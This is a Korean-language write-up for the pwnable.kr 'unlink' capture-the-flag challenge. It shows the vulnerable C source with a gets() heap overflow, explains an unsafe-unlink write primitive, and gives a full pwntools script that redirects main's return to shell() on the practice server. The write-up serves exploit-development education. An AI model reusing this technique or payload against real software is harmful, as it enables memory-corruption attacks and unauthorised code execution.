# [pwnable.kr] unlink

> Daddy! how can I exploit unlink corruption?
>
> ssh unlink@pwnable.kr -p2222 (pw: guest)

## Bug

```c
/* unlink.c */

int main(int argc, char* argv[]){
    malloc(1024);
    OBJ* A = (OBJ*)malloc(sizeof(OBJ));
    OBJ* B = (OBJ*)malloc(sizeof(OBJ));
    OBJ* C = (OBJ*)malloc(sizeof(OBJ));

    // double linked list: A <-> B <-> C
    A->fd = B;
    B->bk = A;
    B->fd = C;
    C->bk = B;

    printf("here is stack address leak: %p\n", &A);
    printf("here is heap address leak: %p\n", A);
    printf("now that you have leaks, get shell!\n");
    // heap overflow!
    gets(A->buf);

    // exploit this unlink!
    unlink(B);
    return 0;
}
```

`gets(A->buf)`에서 heap overflow가 발생하여 `A->buf`부터 `B`와 `C`의 구조 전체를 원하는 값으로 덮어쓸 수 있다.

## Exploit

Stack과 heap의 주소를 leak해 주는 것을 이용하여 `main()`의 return address를 `shell()`의 주소로 덮어쓰면 shell을 획득할 수 있다.

```c
/* unlink.c */

void unlink(OBJ* P){
    OBJ* BK;
    OBJ* FD;
    BK=P->bk;
    FD=P->fd;
    FD->bk=BK;
    BK->fd=FD;
}
```

`unlink()`의 인자로는 `B`가 전달된다. 따라서 이 코드에서 `BK`와 `FD`에 임의의 값을 넣을 수 있다.

![image](https://github.com/user-attachments/assets/eab5d982-9a76-4c0d-9e16-46bce3e8bacb)

![image](https://github.com/user-attachments/assets/fe23d5cb-3767-44fe-ad06-4a80dc673ca9)

`FD->bk=BK;`와 `BK->fd=FD;`를 각각 실행하기 때문에 `FD`와 `BK`는 모두 쓰기 가능한 주소여야 한다. 그래서 `shell()`의 주소를 바로 넣을 수는 없고, heap에 `shell()`의 주소를 넣어 두고 `main()`의 `ebp`를 heap 주소로 덮어서 `shell()`로 return하도록 만들어야 한다.

![image](https://github.com/user-attachments/assets/44e8612d-64e5-49a7-a140-4bb3298f821c)

`main()`의 epilogue를 보면 `ebp-0x4` 위치에 저장된 값에서 4를 빼서 `esp`에 넣는다. 이 `esp`가 가리키는 주소에 `shell()`의 주소가 있으면 `main()`이 `shell()`로 return하게 된다.

```python
# ex.py

from pwn import *

p = ssh("unlink", "pwnable.kr", 2222, "guest").process("/home/unlink/unlink")

shell = 0x80484EB  # shell()

# leak stack and heap
p.recvuntil(b"here is stack address leak: 0x")
esp = int(p.recvline()[:-1], 16) - 0x14  # esp of main()
p.recvuntil(b"here is heap address leak: 0x")
heapbase = int(p.recvline()[:-1], 16) - 0x410  # heapbase
log.info("esp of main(): " + hex(esp))
log.info("heapbase: " + hex(heapbase))

# call shell()
payload = b"A" * 0x10  # dummy
payload += p32(heapbase + 0x430 + 4)  # FD
payload += p32(esp + 0x28 - 4)  # BK
payload += p32(shell)  # heapbase + 0x430

p.sendlineafter(b"now that you have leaks, get shell!\n", payload)

p.interactive()
```

![image](https://github.com/user-attachments/assets/11a10080-21e7-4fa0-bc1b-1914cbf0507e)
